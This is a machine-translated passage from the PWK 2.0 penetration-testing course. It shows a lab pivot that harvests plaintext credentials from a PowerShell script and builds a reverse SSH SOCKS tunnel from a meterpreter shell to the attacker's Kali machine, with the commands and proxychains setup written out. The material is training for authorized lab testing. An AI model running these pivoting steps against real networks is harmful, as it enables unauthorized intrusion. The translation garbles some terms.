<div style="position:absolute;top:213609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 找到一个更好的方法来自动化这个</font></font></nobr></div>
<div style="position:absolute;top:213625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$username = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"沙箱\亚历克斯"</font></font></font></b></nobr></div>
<div style="position:absolute;top:213643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$pwdTxt = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"Ndawc*nRoqkC+haZ"</font></font></font></b></nobr></div>
<div style="position:absolute;top:213660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$securePwd = $pwdTxt | </font><font style="vertical-align: inherit;">ConvertTo-SecureString</font></font></nobr></div>
<div style="position:absolute;top:213677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$credObject = 新对象 System.Management.Automation.PSCredential -ArgumentList $user</font></font></nobr></div>
<div style="position:absolute;top:213694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">姓名，$securePwd</font></font></nobr></div>
<div style="position:absolute;top:213727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 在 Poultry 上启用远程管理</font></font></nobr></div>
<div style="position:absolute;top:213744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$remoteKeyParams = @{</font></font></nobr></div>
<div style="position:absolute;top:213762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算机名 = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"家禽"</font></font></font></b></nobr></div>
<div style="position:absolute;top:213778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径 = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server'</font></font></nobr></div>
<div style="position:absolute;top:213795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 = '启用远程管理'</font></font></nobr></div>
<div style="position:absolute;top:213812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值 = '1' </font></font></nobr></div>
<div style="position:absolute;top:213829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:213846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject</font></font></nobr></div>
<div style="position:absolute;top:213880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 最近运行的奇怪的 calc 进程 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:214015;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="181"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 181 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:214048;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:215125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:215125;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:215125;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">798</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:214144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止进程 -processname calc</font></font></nobr></div>
<div style="position:absolute;top:214160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:214180;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 953 - 检查脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们似乎在 system_report.ps1 文件中发现了一组凭据。</font><font style="vertical-align: inherit;">用户名是</font></font></nobr></div>
<div style="position:absolute;top:214228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“sandbox\alex”，密码是“Ndawc*nRoqkC+haZ“。我们好像也找到了名字</font></font></nobr></div>
<div style="position:absolute;top:214248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">挂载共享的目标，“家禽”。</font><font style="vertical-align: inherit;">查看这个目录下的脚本类型</font></font></nobr></div>
<div style="position:absolute;top:214267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到用户似乎是“沙箱”域的一部分，我们可能会</font></font></nobr></div>
<div style="position:absolute;top:214287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看着一台 Windows 计算机。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:214349;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载您发现的脚本并将它们保存在您的文件夹中是一个好习惯</font></font></i></nobr></div>
<div style="position:absolute;top:214368;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">笔记。</font><font style="vertical-align: inherit;">你永远不知道什么时候某些东西可能会被删除或者客户端什么时候</font></font></i></nobr></div>
<div style="position:absolute;top:214388;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求更多的证据。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:214449;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.5.3</font></font></i></nobr></div>
<div style="position:absolute;top:214449;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建稳定的反向隧道</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们通过 www-data 用户对 Ajla 进行非特权 shell 访问时类似，我们不能使用</font></font></nobr></div>
<div style="position:absolute;top:214507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zora 使用 mysql 帐户的标准 ssh 连接，因为该用户没有 shell</font></font></nobr></div>
<div style="position:absolute;top:214526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认访问。</font></font></nobr></div>
<div style="position:absolute;top:214559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们可以创建一个类似于 Ajla 上使用的 ssh 隧道，但我们还有另一种选择</font></font></nobr></div>
<div style="position:absolute;top:214578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以设置，因为 Zora 正在运行这样一个最新版本的 Alpine。</font><font style="vertical-align: inherit;">较新版本的 ssh 客户端</font></font></nobr></div>
<div style="position:absolute;top:214598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们通过反向动态端口转发建立一种非常有用的隧道类型。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:214632;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH -V</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:214650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpenSSH_8.1p1、OpenSSL 1.1.1d 2019 年 9 月 10 日</font></font></nobr></div>
<div style="position:absolute;top:214669;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 954 - 检查 ssh 客户端版本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:214698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zora 正在运行 ssh 版本 OpenSSH_8.1p1，它应该支持此功能。</font><font style="vertical-align: inherit;">如果我们能得到这个</font></font></nobr></div>
<div style="position:absolute;top:214718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了工作，我们将通过一个完整的网络访问 10.5.5.0/24 沙箱内部网络</font></font></nobr></div>
<div style="position:absolute;top:214737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的 Kali 机器上运行的 SOCKS 代理。</font></font></nobr></div>
<div style="position:absolute;top:214770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们只能访问一个meterpreter shell，我们需要在Zora上创建一个新的ssh密钥并运行</font></font></nobr></div>
<div style="position:absolute;top:214789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh 客户端以不需要交互的方式。</font><font style="vertical-align: inherit;">首先，让我们在 Zora 上生成一个 ssh 密钥。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:214809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将为此使用meterpreter shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:214843;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh-keygen</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:214860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成公钥/私钥 rsa 密钥对。</font></font></nobr></div>
<div style="position:absolute;top:214877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入保存密钥的文件（/var/lib/mysql/.ssh/id_rsa）： </font></font></nobr></div>
<div style="position:absolute;top:214894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入密码（空表示没有密码）： </font></font></nobr></div>
<div style="position:absolute;top:214911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次输入相同的密码： </font></font></nobr></div>
<div style="position:absolute;top:214928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建目录“/var/lib/mysql/.ssh”。</font></font></nobr></div>
<div style="position:absolute;top:214945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的标识已保存在 /var/lib/mysql/.ssh/id_rsa 中。</font></font></nobr></div>
<div style="position:absolute;top:214962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的公钥已保存在 /var/lib/mysql/.ssh/id_rsa.pub 中。</font></font></nobr></div>
<div style="position:absolute;top:214979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:215013;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /var/lib/mysql/.ssh/id_rsa.pub</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4cjmvS ... mysql@zora</font></font></nobr></div>
<div style="position:absolute;top:215049;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 955 - 生成 SSH 密钥 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:215203;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="182"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 182 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:215236;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:216313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:216313;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:216313;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">799</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 SSH 密钥后，我们需要在 Kali 机器上设置 authorized_keys 文件，以便</font></font></nobr></div>
<div style="position:absolute;top:215351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali 用户具有与我们之前所做的相同类型的限制。</font><font style="vertical-align: inherit;">条目的一个例子可以是</font></font></nobr></div>
<div style="position:absolute;top:215370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 956 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from="10.11.1.250",command="echo '此账号只能用于端口转发'",</font></font></nobr></div>
<div style="position:absolute;top:215422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无代理转发，无 X11 转发，无 pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4c</font></font></nobr></div>
<div style="position:absolute;top:215439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmvS... mysql@zora</font></font></nobr></div>
<div style="position:absolute;top:215459;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 956——authorized_keys 文件条目</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“来自”IP 不必更改，因为流量仍然来自外部防火墙，因为</font></font></nobr></div>
<div style="position:absolute;top:215507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就我们的 Kali 系统而言。</font><font style="vertical-align: inherit;">不过，我们使用的 ssh 命令确实需要稍作更改。</font></font></nobr></div>
<div style="position:absolute;top:215527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这一次，我们不需要多个远程端口转发选项。</font><font style="vertical-align: inherit;">我们只需要一个端口</font></font></nobr></div>
<div style="position:absolute;top:215546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转发选项，即</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R 1080</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">通过在端口后不包括主机，ssh 被指示</font></font></nobr></div>
<div style="position:absolute;top:215565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的 Kali 服务器上创建一个 SOCKS 代理。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">739</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还需要更改私钥的位置。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -f -N </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R 1080</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:215617;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var/lib/mysql/.ssh/id_rsa </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@10.11.0.4</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215637;left:254"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 957 - 用于反向动态端口转发到 Kali 的 SSH 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 meterpreter shell 中运行这个命令应该启动到我们 Kali 的 ssh 连接</font></font></nobr></div>
<div style="position:absolute;top:215685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;span custom-style="BoldCodeUser"&gt;ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null"</font></font></nobr></div>
<div style="position:absolute;top:215737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4/cu&gt;</font></font></nobr></div>
<div style="position:absolute;top:215754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：将“10.11.0.4”（ECDSA）永久添加到已知主机列表中。</font></font></nobr></div>
<div style="position:absolute;top:215773;left:198"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 958 - 在 metasploit 中运行 SSH 命令以进行反向动态端口转发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:215803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过</font><font style="vertical-align: inherit;">在 Kali 系统上</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来仔细检查端口是否已打开</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo netstat -tulpn</font></font></font></b></nobr></div>
<div style="position:absolute;top:215855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动 Internet 连接（仅限服务器）</font></font></nobr></div>
<div style="position:absolute;top:215872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proto Recv-Q Send-Q 本地地址外地址状态PID/程序名称</font></font></nobr></div>
<div style="position:absolute;top:215889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:215889;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:111 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:215889;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 1/systemd</font></font></nobr></div>
<div style="position:absolute;top:215906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:215906;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:22 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:215906;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 645/sshd</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:215923;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></b></nobr></div>
<div style="position:absolute;top:215923;left:198"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 127.0.0.1:1080 0.0.0.0:*    </font></font></b></nobr></div>
<div style="position:absolute;top:215923;left:538"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 99765/sshd：kali</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 :::111    </font></font></nobr></div>
<div style="position:absolute;top:215940;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:215940;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 1/systemd</font></font></nobr></div>
<div style="position:absolute;top:215956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 :::22    </font></font></nobr></div>
<div style="position:absolute;top:215956;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:215956;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 645/sshd</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:215974;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 ::1:1080    </font></font></b></nobr></div>
<div style="position:absolute;top:215974;left:400"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></b></nobr></div>
<div style="position:absolute;top:215974;left:538"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 99765/sshd：kali</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:215991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP    </font></font></nobr></div>
<div style="position:absolute;top:215991;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:1194 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:215991;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">94368/openvpn</font></font></nobr></div>
<div style="position:absolute;top:216008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP    </font></font></nobr></div>
<div style="position:absolute;top:216008;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:111 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:216008;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1/系统</font></font></nobr></div>
<div style="position:absolute;top:216025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP6 0 0 :::111    </font></font></nobr></div>
<div style="position:absolute;top:216025;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:216025;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1/系统</font></font></nobr></div>
<div style="position:absolute;top:216044;left:250"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 959 - 验证反向动态端口转发是否已创建</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:216073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建立动态反向隧道后，我们可以在 Kali 上配置代理链以使用</font></font></nobr></div>
<div style="position:absolute;top:216092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">袜子代理。</font><font style="vertical-align: inherit;">我们可以通过打开 etc/proxychains.conf 并编辑最后一行，指定</font></font></nobr></div>
<div style="position:absolute;top:216112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 1080。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:216147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># proxychains.conf 版本 3.1</font></font></nobr></div>
<div style="position:absolute;top:216164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font></nobr></div>
<div style="position:absolute;top:216181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#    </font></font></nobr></div>
<div style="position:absolute;top:216181;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有 DNS 的 HTTP、SOCKS4、SOCKS5 隧道代理。</font></font></nobr></div>
<div style="position:absolute;top:216198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:216263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">739 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（OpenBSD 基金会，2019 年），https://man.openbsd.org/ssh#R_5</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:216391;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="183"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 183 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:216424;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:217501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:217501;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:217501;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">800</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:216520;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:216536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[代理列表]</font></font></nobr></div>
<div style="position:absolute;top:216553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 在这里添加代理...</font></font></nobr></div>
<div style="position:absolute;top:216570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 意思是</font></font></nobr></div>
<div style="position:absolute;top:216588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 默认设置为“tor”</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:216604;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">袜子 4 127.0.0.1 1080</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:216624;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 960 - 配置代理链</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:216653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们应该有一个稳定的隧道可以访问10.5.5.0/24网络，可以继续了</font></font></nobr></div>
<div style="position:absolute;top:216672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在 Zora 上的共享中发现了下一个目标 Poultry。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:216710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6 以家禽为目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:216751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们继续之前，回顾一下我们知道的和不知道的会有所帮助。</font><font style="vertical-align: inherit;">我们知道阿吉拉</font></font></nobr></div>
